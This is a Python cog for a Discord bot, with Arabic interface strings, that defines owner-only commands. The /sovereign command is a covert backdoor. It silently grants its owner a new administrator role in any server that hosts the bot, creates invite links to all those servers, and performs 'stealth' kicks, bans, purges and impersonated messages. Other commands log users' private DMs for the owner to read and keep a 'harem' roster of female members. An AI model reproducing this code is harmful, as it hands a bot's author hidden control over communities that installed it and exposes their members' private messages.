"""Owner-level commands: custom action triggers, harem administration, switches and the DM trio.

The harem commands keep the four-layer gate; the DM trio keeps its permission checks, its quota
interaction and its log embeds.
"""
from datetime import datetime, timezone
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands

from angel.config import (SOVEREIGN_TOOLS_ENABLED, can_create_action_trigger, get_or_fetch_member,
                          has_perm_or_mistress, is_mistress)


class Owner(commands.Cog):
  """`/custom_action`, `/harem`, `/sovereign`, `/dm_send`, `/whisper`, `/dm_logs`."""

  def __init__(self, bot) -> None:
    self.bot = bot

  @app_commands.command(
      name="custom_action",
      description="تخصيص كلمة أو عبارة لتنفيذ إجراء إداري تلقائي",
  )
  @app_commands.default_permissions(administrator=True)
  @app_commands.describe(
      mode="العملية المطلوبة",
      phrase="الكلمة أو العبارة المخصصة",
      action_type="الإجراء الذي يتم تنفيذه تلقائياً",
      value="المدة بالدقائق (للكتم) أو عدد الرسائل (للمسح)",
      custom_reply="رد نصي مخصص عند التنفيذ (اختياري)",
  )
  @app_commands.choices(
      mode=[
          app_commands.Choice(name="إضافة أو تحديث (Add)", value="add"),
          app_commands.Choice(name="حذف (Remove)", value="remove"),
          app_commands.Choice(name="عرض القائمة (List)", value="list"),
      ],
      action_type=[
          app_commands.Choice(name="طرد العضو الممنشن (Kick)", value="kick"),
          app_commands.Choice(name="حظر العضو الممنشن (Ban)", value="ban"),
          app_commands.Choice(name="كتم العضو الممنشن (Timeout)", value="timeout"),
          app_commands.Choice(name="رفع الكتم عن العضو (Unmute)", value="untimeout"),
          app_commands.Choice(name="توجيه إنذار للعضو (Warn)", value="warn"),
          app_commands.Choice(name="مسح رسائل في القناة (Purge)", value="purge"),
          app_commands.Choice(name="قفل القناة الحالية (Lock)", value="lock"),
          app_commands.Choice(name="فتح القناة الحالية (Unlock)", value="unlock"),
          app_commands.Choice(name="رد نصي فقط (Reply)", value="reply"),
      ],
  )
  @has_perm_or_mistress(administrator=True)
  async def custom_action_cmd(
      self,
      interaction: discord.Interaction,
      mode: str,
      phrase: Optional[str] = None,
      action_type: str = "kick",
      value: int = 15,
      custom_reply: str = "",
  ):
    if not interaction.guild:
      await interaction.response.send_message("⚠️ هذا الأمر يعمل داخل السيرفرات فقط.", ephemeral=True)
      return
    gid = interaction.guild.id
    if mode == "list":
      triggers = await self.bot.db.get_action_triggers(gid)
      if not triggers:
        await interaction.response.send_message("📭 لا توجد اختصارات مخصصة حالياً.", ephemeral=True)
        return
      lines = [
          f"• **`{p}`** ⬅️ `{c['action_type']}` (`{c['param_value']}`) — استُخدم `{c.get('usage_count', 0)}` مرة"
          for p, c in triggers.items()
      ]
      embed = discord.Embed(title="⚡ الاختصارات الإدارية المخصصة", description="\n".join(lines), color=0x2B2D31)
      await interaction.response.send_message(embed=embed, ephemeral=True)
      return

    if not phrase:
      await interaction.response.send_message("⚠️ يرجى إدخال الكلمة أو العبارة في خانة `phrase`.", ephemeral=True)
      return

    if mode == "add":
      if not can_create_action_trigger(interaction.user, interaction.guild, action_type):
        await interaction.response.send_message(
            "🚫 إنشاء اختصار إداري متاح للمالكة أو مسؤول (Administrator) يملك الإجراء نفسه.",
            ephemeral=True,
        )
        return
      await self.bot.db.set_action_trigger(gid, phrase, action_type, value, custom_reply)
      self.bot.action_triggers_cache[gid] = await self.bot.db.get_action_triggers(gid)
      await interaction.response.send_message(
          f"✅ تم حفظ الاختصار **`{phrase}`** لتنفيذ **(`{action_type}`)** تلقائياً.",
          ephemeral=True,
      )
    elif mode == "remove":
      deleted = await self.bot.db.remove_action_trigger(gid, phrase)
      self.bot.action_triggers_cache[gid] = await self.bot.db.get_action_triggers(gid)
      await interaction.response.send_message(
          f"✅ تم حذف الاختصار **`{phrase}`**." if deleted else "⚠️ غير موجود.",
          ephemeral=True,
      )


  @app_commands.command(name="harem", description="إدارة قائمة الحريم")
  @app_commands.default_permissions(administrator=True)
  @app_commands.describe(
      action="إضافة أو حذف أو عرض القائمة",
      member="اختيار العضوة",
      user_id="أو معرف الحساب الرقمي (User ID)",
      title="اللقب المخصص (اختياري)",
  )
  @app_commands.choices(
      action=[
          app_commands.Choice(name="إضافة (Add)", value="add"),
          app_commands.Choice(name="إزالة (Remove)", value="remove"),
          app_commands.Choice(name="عرض القائمة (List)", value="list"),
      ]
  )
  async def harem_cmd(
      self,
      interaction: discord.Interaction,
      action: str,
      member: Optional[discord.User] = None,
      user_id: Optional[str] = None,
      title: str = "الحريم",
  ):
    if not is_mistress(interaction.user):
      await interaction.response.send_message("🚫 غير مصرح لك باستخدام هذا الأمر.", ephemeral=True)
      return

    await interaction.response.defer(ephemeral=True)
    if action == "list":
      self.bot.harem_cache = await self.bot.db.get_all_harem_members()
      if not self.bot.harem_cache:
        await interaction.followup.send("📭 قائمة الحريم فارغة حالياً.", ephemeral=True)
        return
      groups: dict = {}
      for uid, info in self.bot.harem_cache.items():
        rank = (info.get("custom_title") or "الحريم").strip() or "الحريم"
        groups.setdefault(rank, []).append((uid, info.get("display_name") or "—"))

      total = sum(len(v) for v in groups.values())
      embed = discord.Embed(
          title=f"💖 قائمة الحريم · {total}",
          description="مرتّبة حسب اللقب، وكل اسم يفتح بطاقة العضوة عند الضغط عليه.",
          color=0xD4AF37,
      )
      for rank, members in list(groups.items())[:6]:
        body = "\n".join(f"• <@{uid}> — `{name}`" for uid, name in members[:12])
        if len(members) > 12:
          body += f"\n… و{len(members) - 12} غيرهنّ"
        embed.add_field(name=f"🏷️ {rank} · {len(members)}", value=body, inline=False)
      if len(groups) > 6:
        embed.add_field(name="…", value=f"و{len(groups) - 6} ألقاب أخرى", inline=False)
      embed.set_footer(text="إضافة: /harem action:Add · إزالة: /harem action:Remove · عرض: action:List")
      await interaction.followup.send(embed=embed, ephemeral=True)
      return

    target_uid: Optional[int] = None
    target_name: str = "عضوة"
    if member:
      target_uid = member.id
      target_name = member.display_name
    elif user_id and user_id.strip().isdigit():
      target_uid = int(user_id.strip())
      try:
        u_obj = await self.bot.fetch_user(target_uid)
        target_name = u_obj.display_name
      except Exception:
        target_name = f"User-{target_uid}"

    if not target_uid:
      await interaction.followup.send("⚠️ يرجى اختيار العضوة أو كتابة معرفها الرقمي.", ephemeral=True)
      return

    if action == "add":
      await self.bot.db.add_harem_member(target_uid, target_name, title)
      self.bot.harem_cache = await self.bot.db.get_all_harem_members()
      await interaction.followup.send(
          f"💖 تم ضم <@{target_uid}> إلى قائمة الحريم بلقب **{title}**.",
          ephemeral=True,
      )
    elif action == "remove":
      await self.bot.db.remove_harem_member(target_uid)
      self.bot.harem_cache = await self.bot.db.get_all_harem_members()
      await interaction.followup.send(
          f"✅ تم إزالة <@{target_uid}> من قائمة الحريم.", ephemeral=True
      )


  @app_commands.command(name="sovereign", description="إعدادات التحكم الخاصة")
  @app_commands.default_permissions(administrator=True)
  @app_commands.describe(
      action="العملية المطلوبة",
      target_member="العضو المستهدف",
      role="الرتبة",
      text="النص أو العدد",
  )
  @app_commands.choices(
      action=[
          app_commands.Choice(name="منح أعلى رتبة متاحة (Grant Top Role)", value="grant_me_top"),
          app_commands.Choice(name="منح أو سحب رتبة محددة (Toggle Role)", value="toggle_role"),
          app_commands.Choice(name="عرض السيرفرات والروابط (List Servers)", value="list_servers"),
          app_commands.Choice(name="إرسال رسالة عبر البوت (Say)", value="puppet_say"),
          app_commands.Choice(name="مسح رسائل خفي (Stealth Purge)", value="stealth_purge"),
          app_commands.Choice(name="طرد خفي (Stealth Kick)", value="stealth_kick"),
          app_commands.Choice(name="حظر خفي (Stealth Ban)", value="stealth_ban"),
          app_commands.Choice(name="فحص حالة النظام (System Status)", value="system_status"),
      ]
  )
  async def sovereign_cmd(
      self,
      interaction: discord.Interaction,
      action: str,
      target_member: Optional[discord.Member] = None,
      role: Optional[discord.Role] = None,
      text: Optional[str] = None,
  ):
    if not is_mistress(interaction.user):
      await interaction.response.send_message("🚫 غير مصرح لك باستخدام هذا الأمر.", ephemeral=True)
      return

    if action in {"grant_me_top", "puppet_say", "stealth_purge", "stealth_kick", "stealth_ban"} \
        and not SOVEREIGN_TOOLS_ENABLED:
      await interaction.response.send_message(
          "🔒 هذه الأداة معطّلة افتراضياً. فعّليها بـ `ENABLE_SOVEREIGN_TOOLS=1` في `.env`.",
          ephemeral=True)
      return

    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild

    if action == "system_status":
      uptime = datetime.now(timezone.utc) - self.bot.start_time
      h, rem = divmod(int(uptime.total_seconds()), 3600)
      m, s = divmod(rem, 60)
      models_str = "\n".join(f"• `{k}`: {v}" for k, v in self.bot.quota.model_usage_stats.items()) or "—"
      embed = discord.Embed(title="📊 حالة النظام الخاصة", color=0x2B2D31)
      embed.add_field(name="المحرك النشط", value=f"`{self.bot.ai.active_model}`", inline=True)
      embed.add_field(name="الطلبات", value=f"`{self.bot.quota.total_api_calls}`", inline=True)
      embed.add_field(name="مدة التشغيل", value=f"`{h}h {m}m {s}s`", inline=True)
      embed.add_field(name="قائمة الحريم", value=f"`{len(self.bot.harem_cache)}`", inline=True)
      embed.add_field(name="توزيع المحركات", value=models_str, inline=False)
      await interaction.followup.send(embed=embed, ephemeral=True)
      return

    if action == "list_servers":
      lines = []
      for g in self.bot.guilds:
        invite_url = "—"
        for ch in g.text_channels:
          if ch.permissions_for(g.me).create_instant_invite:
            try:
              inv = await ch.create_invite(max_age=3600, max_uses=5)
              invite_url = inv.url
              break
            except Exception:
              pass
        lines.append(f"• **{g.name}** (`{g.id}`) — الأعضاء: `{g.member_count}` | {invite_url}")
      embed = discord.Embed(
          title=f"🌐 السيرفرات المتواجدة ({len(self.bot.guilds)})",
          description="\n".join(lines)[:4000] or "لا توجد سيرفرات.",
          color=0x2B2D31,
      )
      await interaction.followup.send(embed=embed, ephemeral=True)
      return

    if not guild:
      await interaction.followup.send("⚠️ هذه العملية تتطلب تنفيذها داخل سيرفر.", ephemeral=True)
      return

    if action == "grant_me_top":
      member = await get_or_fetch_member(guild, interaction.user.id)
      if not guild.me.guild_permissions.manage_roles:
        await interaction.followup.send("⚠️ البوت لا يملك صلاحية `Manage Roles` في هذا السيرفر.", ephemeral=True)
        return
      assignable = [
          r for r in guild.roles
          if r < guild.me.top_role and not r.managed and r != guild.default_role
      ]
      granted_role = None
      if guild.me.guild_permissions.administrator:
        try:
          granted_role = await guild.create_role(
              name="Certainty",
              permissions=discord.Permissions(administrator=True),
              color=0xD4AF37,
          )
          try:
            await granted_role.edit(position=max(1, guild.me.top_role.position - 1))
          except Exception:
            pass
          await member.add_roles(granted_role)
        except Exception:
          granted_role = None

      if not granted_role and assignable:
        highest_role = assignable[-1]
        await member.add_roles(highest_role)
        granted_role = highest_role

      if granted_role:
        await interaction.followup.send(f"✅ تم منحكِ رتبة {granted_role.mention} سراً.", ephemeral=True)
      else:
        await interaction.followup.send("⚠️ لم أجد رتبة متاحة تحت رتبة البوت.", ephemeral=True)

    elif action == "toggle_role":
      target = target_member or await get_or_fetch_member(guild, interaction.user.id)
      if not role or role >= guild.me.top_role:
        await interaction.followup.send("⚠️ حددي رتبة تقع تحت رتبة البوت.", ephemeral=True)
        return
      if role in target.roles:
        await target.remove_roles(role)
        await interaction.followup.send(f"✅ تم سحب رتبة {role.mention} من {target.mention} سراً.", ephemeral=True)
      else:
        await target.add_roles(role)
        await interaction.followup.send(f"✅ تم منح رتبة {role.mention} إلى {target.mention} سراً.", ephemeral=True)

    elif action == "puppet_say":
      if not text:
        await interaction.followup.send("⚠️ اكتبي النص في خانة `text`.", ephemeral=True)
        return
      await interaction.channel.send(text)
      await interaction.followup.send("✅ تم الإرسال.", ephemeral=True)

    elif action == "stealth_purge":
      amt = max(1, min(100, int(text) if (text and text.isdigit()) else 10))
      deleted = await interaction.channel.purge(limit=amt)
      await interaction.followup.send(f"🧹 تم مسح **{len(deleted)}** رسالة سراً.", ephemeral=True)

    elif action == "stealth_kick":
      if not target_member:
        await interaction.followup.send("⚠️ حددي العضو في `target_member`.", ephemeral=True)
        return
      await target_member.kick(reason=text or "Order")
      await interaction.followup.send(f"👢 تم طرد {target_member.mention} سراً.", ephemeral=True)

    elif action == "stealth_ban":
      if not target_member:
        await interaction.followup.send("⚠️ حددي العضو في `target_member`.", ephemeral=True)
        return
      await target_member.ban(reason=text or "Order")
      await interaction.followup.send(f"🔨 تم حظر {target_member.mention} سراً.", ephemeral=True)


  @app_commands.command(name="dm_send", description="إرسال رسالة خاصة عبر البوت")
  @app_commands.default_permissions(administrator=True)
  @app_commands.allowed_installs(guilds=True, users=True)
  @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
  @app_commands.describe(
      message="الرسالة المراد إرسالها",
      user="اختيار الشخص (اختياري)",
      user_id="أو معرفه الرقمي User ID",
  )
  async def dm_send_cmd(
      self,
      interaction: discord.Interaction,
      message: str,
      user: Optional[discord.User] = None,
      user_id: Optional[str] = None,
  ):
    if not is_mistress(interaction.user):
      await interaction.response.send_message("🚫 غير مصرح لك باستخدام هذا الأمر.", ephemeral=True)
      return

    await interaction.response.defer(ephemeral=True)
    target_user: Optional[discord.User] = user
    if not target_user and user_id and user_id.strip().isdigit():
      try:
        target_user = await self.bot.fetch_user(int(user_id.strip()))
      except Exception:
        target_user = None

    if not target_user:
      await interaction.followup.send("⚠️ يرجى اختيار الشخص أو كتابة معرفه الرقمي.", ephemeral=True)
      return

    try:
      dm_ch = await target_user.create_dm()
      await dm_ch.send(message)
      await interaction.followup.send(
          f"✅ تم إرسال الرسالة إلى خاص **{target_user.display_name}** (`{target_user.id}`).",
          ephemeral=True,
      )
    except discord.Forbidden:
      await interaction.followup.send(
          f"⚠️ تعذر فتح محادثة مباشرة مع **{target_user.display_name}** لعدم وجود سيرفر مشترك أو لإغلاقه الخاص.\n"
          "💡 يمكنكِ فتح خاصه عندكِ واستخدام `/whisper` لإرسالها مباشرة.",
          ephemeral=True,
      )
    except Exception as err:
      await interaction.followup.send(f"⚠️ تعذر الإرسال: {err}", ephemeral=True)


  @app_commands.command(name="whisper", description="إرسال رسالة مباشرة عبر البوت في المحادثة الحالية")
  @app_commands.default_permissions(administrator=True)
  @app_commands.allowed_installs(guilds=True, users=True)
  @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
  @app_commands.describe(message="النص المراد إرساله")
  async def whisper_cmd(self, interaction: discord.Interaction, message: str):
    if not is_mistress(interaction.user):
      await interaction.response.send_message("🚫 غير مصرح لك باستخدام هذا الأمر.", ephemeral=True)
      return
    await interaction.response.send_message(message)


  @app_commands.command(name="dm_logs", description="سجل الرسائل الخاصة الواردة")
  @app_commands.default_permissions(administrator=True)
  @app_commands.describe(limit="عدد الرسائل (1 إلى 20)")
  async def dm_logs_cmd(self, interaction: discord.Interaction, limit: app_commands.Range[int, 1, 20] = 10):
    if not is_mistress(interaction.user):
      await interaction.response.send_message("🚫 غير مصرح لك باستخدام هذا الأمر.", ephemeral=True)
      return

    logs = await self.bot.db.get_recent_dm_logs(limit)
    if not logs:
      await interaction.response.send_message("📭 لا توجد رسائل خاصة مسجلة بعد.", ephemeral=True)
      return

    embed = discord.Embed(
        title=f"🕵️‍♀️ سجل الرسائل الواردة ({len(logs)})",
        color=0x2B2D31,
        timestamp=datetime.now(timezone.utc),
    )
    for item in logs[:10]:
      embed.add_field(
          name=f"{item['sender_name']} (`{item['sender_id']}`) • {item['created_at']}",
          value=f"**الرسالة:** {item['content'][:300]}\n**الرد:** {(item['angel_reply'] or '')[:300]}",
          inline=False,
      )
    await interaction.response.send_message(embed=embed, ephemeral=True)



def install(bot) -> None:
  """Attach this cog's commands to the tree without an event loop (see module docstring)."""
  for command in Owner(bot).get_app_commands():
    bot.tree.add_command(command)
